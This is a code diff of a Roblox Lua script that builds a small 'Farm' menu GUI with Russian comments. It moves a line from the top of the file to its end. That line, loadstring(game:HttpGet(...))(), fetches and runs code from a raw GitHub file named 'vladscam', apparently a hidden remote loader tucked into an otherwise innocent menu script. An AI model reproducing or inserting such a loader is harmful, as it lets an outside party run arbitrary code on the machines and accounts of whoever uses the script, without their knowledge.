@@ -7,7 +7,6 @@ menuFrame.Size = UDim2.new(0.3, 0, 0.3, 0) -- Уменьшенный разме�
 menuFrame.Position = UDim2.new(0.35, 0, 0.35, 0)
 menuFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 menuFrame.Parent = screenGui
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Gusha312/scriptkwqf3124/refs/heads/main/vladscam"))()
 
 -- Создаем кнопку "Farm"
 local farmButton = Instance.new('TextButton')
@@ -143,3 +142,4 @@ UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
     menuFrame.Visible = not menuFrame.Visible -- Переключаем видимость меню
   end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Gusha312/scriptkwqf3124/refs/heads/main/vladscam"))()
